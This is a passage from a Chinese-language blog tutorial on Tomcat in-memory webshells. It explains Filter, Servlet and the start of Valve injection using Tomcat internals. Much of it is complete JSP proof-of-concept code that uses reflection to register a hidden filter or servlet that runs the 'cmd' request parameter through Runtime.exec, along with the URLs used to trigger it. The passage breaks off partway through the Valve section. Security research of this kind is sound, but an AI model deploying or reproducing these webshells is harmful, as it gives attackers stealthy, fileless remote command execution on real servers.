class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<span class="hljs-comment">//获取StandardContext对象</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <span class="hljs-comment">//恶意Filter，主要是doFilter方法</span><br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//使用FilterDef封装filter</span><br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <span class="hljs-comment">//创建filterMap，filterMap用于路由映射</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <span class="hljs-comment">//反射封装filterConfig及filterDef到filterConfigs </span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>先注册恶意Filter</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Filter.jsp<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010440959.png" srcset="/img/loading.gif" lazyload alt="image-20230201044023838"></p>
+<h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>先创建一个恶意Servlet</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(name = &quot;Shell_Servlet&quot;, value = &quot;/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125;<span class="hljs-keyword">catch</span> (IOException | NullPointerException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010555517.png" srcset="/img/loading.gif" lazyload alt="image-20230201055527413"></p>
+<p>接着需要实现动态注册Servlet</p>
+<h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>Servlet的生命周期分为如下五部分</p>
+<ol>
+<li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li>
+<li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li>
+<li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li>
+<li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li>
+<li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li>
+</ol>
+<blockquote>
+<p>Wrapper是对Servlet的抽象和包装，每个Context可以有多个Wrapper，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收,也是接下来注册恶意Servlet的关键</p>
+</blockquote>
+<h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fireLifecycleEvent</span><span class="hljs-params">(String type, Object data)</span> &#123;<br>        <span class="hljs-type">LifecycleEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LifecycleEvent</span>(<span class="hljs-built_in">this</span>, type, data);<br>        <span class="hljs-keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;<br>            listener.lifecycleEvent(event);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p>
+</blockquote>
+<p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br> <br>...   <span class="hljs-comment">//设置StandardContext参数</span><br> <br>        <br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br> <br>            <span class="hljs-comment">//创建StandardWrapper对象</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br> <br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br> <br>                <span class="hljs-comment">//设置LoadOnStartup属性</span><br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletName属性</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletClass属性</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            ...<br>            wrapper.setOverridable(servlet.isOverridable());<br> <br>            <span class="hljs-comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span><br>            context.addChild(wrapper);<br> <br>           <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//添加路径映射</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addServletMappingDecoded</span><span class="hljs-params">(String pattern, String name,</span><br><span class="hljs-params">                                  <span class="hljs-type">boolean</span> jspWildCard)</span> &#123;<br><span class="hljs-comment">//...</span><br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) findChild(name);<br><span class="hljs-comment">//...</span><br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Container child : findChildren()) &#123;<br>    <span class="hljs-keyword">if</span> (!child.getState().isAvailable()) &#123;<br>        child.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br> <br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br> <br>        <span class="hljs-comment">//判断属性loadOnStartup的值</span><br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br> <br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<span class="hljs-comment">//加载Servlet</span><br>            &#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>最后的poc中需要注意<code>loadOnStartup</code>属性的设置，只有大于0才会被放入list，进而被加载<code>wrapper.load()</code></p>
+</blockquote>
+<h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上面的分析可以总结流程</p>
+<ol>
+<li>获取<code>StandardContext</code>对象</li>
+<li>编写恶意Servlet</li>
+<li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li>
+<li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>、<code>ServletName</code>、<code>ServletClass</code>属性值</li>
+<li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li>
+<li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li>
+</ol>
+<h4 id="完整POC链"><a href="#完整POC链" class="headerlink" title="完整POC链"></a>完整POC链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<span class="hljs-comment">//得到StandardContext对象</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br> <br>&lt;%!<br> <span class="hljs-comment">//恶意Servlet</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//创建StandardWrapper并设置对应属性</span><br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<span class="hljs-comment">//不能小于0</span><br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//绑定路由</span><br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>先注册Servlet</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Servlet.jsp<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010647020.png" srcset="/img/loading.gif" lazyload alt="image-20230201064710941"></p>
+<blockquote>
+<p>Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p>
+</blockquote>
+<h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>需要先了解一下tomcat中的管道机制</p>
+<p>Tomcat 在处理一个请求调用逻辑时需要传递Request 和 Respone 对象，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p>
+<p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010646623.png" srcset="/img/loading.gif" lazyload alt="image-20230201064647521"></p>
+<blockquote>
+<p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p>
+</blockquote>
+<h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>先来简单看一下接口的定义，<code>org.apache.catalina.Pipeline</code> 的定义如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pipeline</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Contained</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getBasic</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBasic</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//增加阀门*</span><br>    <span class="hljs-keyword">public</span> Valve[] getValves();<span class="hljs-comment">//获取</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//移除</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取首个</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span 